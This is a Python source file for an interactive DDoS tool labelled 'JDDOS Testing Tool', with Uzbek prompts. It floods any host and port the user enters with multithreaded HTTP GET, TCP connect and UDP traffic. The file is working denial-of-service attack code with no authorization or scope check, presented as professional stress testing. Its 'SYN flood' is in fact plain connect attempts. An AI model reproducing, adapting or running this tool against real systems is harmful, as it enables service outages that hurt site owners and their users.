"""
=====================================
    JDDOS Testing Tool v2.0
=====================================
Professional DDoS Stress Testing Tool
Yasalgan: Jony - March 2026
=====================================
"""

import socket
import threading
import time
import random
import sys
import os
from concurrent.futures import ThreadPoolExecutor
import requests
from datetime import datetime

class JDDOSTool:
    def __init__(self):
        self.target_host = None
        self.target_port = None
        self.rate = None
        self.attack_type = None
        self.running = False
        self.successful = 0
        self.failed = 0
        self.total = 0
        self.lock = threading.Lock()
        self.start_time = None
        
    def banner(self):
        """JDDOS banner ko'rsatish"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
=====================================
    🔥 JDDOS Testing Tool v2.0 🔥
=====================================
Professional DDoS Stress Testing Tool
Yasalgan: Jony - March 2026
=====================================
        """)
    
    def get_input(self):
        """Foydalanuvchi input olish"""
        print("📡 Maqsadni kiriting:")
        self.target_host = input("IP/Host > ").strip()
        
        print("🔌 Port kiriting:")
        while True:
            try:
                self.target_port = int(input("Port > "))
                if 1 <= self.target_port <= 65535:
                    break
                print("❌ Port 1-65535 oralig'ida bo'lishi kerak!")
            except ValueError:
                print("❌ To'g'ri raqam kiriting!")
        
        print("⚡ So'rovlar soni (sekundiga):")
        while True:
            try:
                self.rate = int(input("Rate > "))
                if self.rate > 0:
                    break
                print("❌ 1 dan katta bo'lishi kerak!")
            except ValueError:
                print("❌ To'g'ri raqam kiriting!")
        
        print("\n🎯 Attack Turlari:")
        print("1. HTTP GET Flood")
        print("2. TCP SYN Flood") 
        print("3. UDP Flood")
        print("4. MIXED (Barchasi)")
        
        while True:
            choice = input("Tanlang (1-4) > ").strip()
            if choice == "1":
                self.attack_type = "http"
                break
            elif choice == "2":
                self.attack_type = "tcp"
                break
            elif choice == "3":
                self.attack_type = "udp"
                break
            elif choice == "4":
                self.attack_type = "mixed"
                break
            else:
                print("❌ 1-4 oralig'ida tanlang!")
    
    def stats_display(self):
        """Real-time statistika"""
        while self.running:
            with self.lock:
                uptime = time.time() - self.start_time
                rps = self.total / uptime if uptime > 0 else 0
                success_rate = (self.successful / max(self.total, 1)) * 100
                
                print(f"\r🎯 TARGET: {self.target_host}:{self.target_port} | "
                      f"⚡ RPS: {rps:.0f} | "
                      f"✅ OK: {self.successful} | "
                      f"❌ ERR: {self.failed} | "
                      f"📊 {success_rate:.1f}% | "
                      f"⏱️ {uptime:.0f}s", end="", flush=True)
            time.sleep(0.5)
    
    def http_attack(self):
        """HTTP Flood"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        while self.running:
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                response = requests.get(
                    f"http://{self.target_host}:{self.target_port}",
                    headers=headers, timeout=2, stream=True
                )
                with self.lock:
                    self.successful += 1
                    self.total += 1
            except:
                with self.lock:
                    self.failed += 1
                    self.total += 1
    
    def tcp_attack(self):
        """TCP SYN Flood"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target_host, self.target_port))
                sock.close()
                with self.lock:
                    if result == 0:
                        self.successful += 1
                    else:
                        self.failed += 1
                    self.total += 1
            except:
                with self.lock:
                    self.failed += 1
                    self.total += 1
    
    def udp_attack(self):
        """UDP Flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1400)
        
        while self.running:
            try:
                sock.sendto(payload, (self.target_host, self.target_port))
                with self.lock:
                    self.successful += 1
                    self.total += 1
            except:
                with self.lock:
                    self.failed += 1
                    self.total += 1
    
    def start_attack(self):
        """Hujumni boshlash"""
        self.running = True
        self.start_time = time.time()
        
        print(f"\n🚀 Hujum boshlanmoqda...")
        print(f"🎯 Target: {self.target_host}:{self.target_port}")
        print(f"⚡ Rate: {self.rate} req/sec")
        print(f"🔥 Type: {self.attack_type.upper()}")
        print("=" * 50)
        print("Ctrl+C bilan to'xtatish")
        print("=" * 50)
        
        # Stats thread
        stats_thread = threading.Thread(target=self.stats_display, daemon=True)
        stats_thread.start()
        
        # Main attack threads
        num_threads = max(50, self.rate // 5)
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            if self.attack_type == "http":
                [executor.submit(self.http_attack) for _ in range(num_threads)]
            elif self.attack_type == "tcp":
                [executor.submit(self.tcp_attack) for _ in range(num_threads)]
            elif self.attack_type == "udp":
                [executor.submit(self.udp_attack) for _ in range(num_threads)]
            else:  # mixed
                for i in range(num_threads):
                    if i % 3 == 0: executor.submit(self.http_attack)
                    elif i % 3 == 1: executor.submit(self.tcp_attack)
                    else: executor.submit(self.udp_attack)
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop_attack()
    
    def stop_attack(self):
        """Hujumni to'xtatish"""
        print("\n\n🛑 Hujum to'xtatilmoqda...")
        self.running = False
        time.sleep(2)
        
        uptime = time.time() - self.start_time
        rps = self.total / uptime if uptime > 0 else 0
        success_rate = (self.successful / max(self.total, 1)) * 100
        
        print("\n" + "="*50)
        print("📊 FINAL REPORT")
        print("="*50)
        print(f"🎯 Target: {self.target_host}:{self.target_port}")
        print(f"⏱️  Uptime: {uptime:.1f} seconds")
        print(f"⚡ Average RPS: {rps:.0f}")
        print(f"📈 Total Requests: {self.total:,}")
        print(f"✅ Successful: {self.successful:,} ({success_rate:.1f}%)")
        print(f"❌ Failed: {self.failed:,}")
        print("="*50)

def main():
    tool = JDDOSTool()
    
    while True:
        tool.banner()
        tool.get_input()
        
        print("\n🎬 BOSHLAsh uchun Enter bosing yoki 'q' chiqish uchun")
        choice = input("> ").strip().lower()
        
        if choice == 'q':
            print("👋 Xayr!")
            sys.exit(0)
        
        tool.start_attack()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--install":
        print("✅ JDDOS Tool tayyor! Faqat python3 bilan ishga tushiring.")
        sys.exit(0)
    
    main()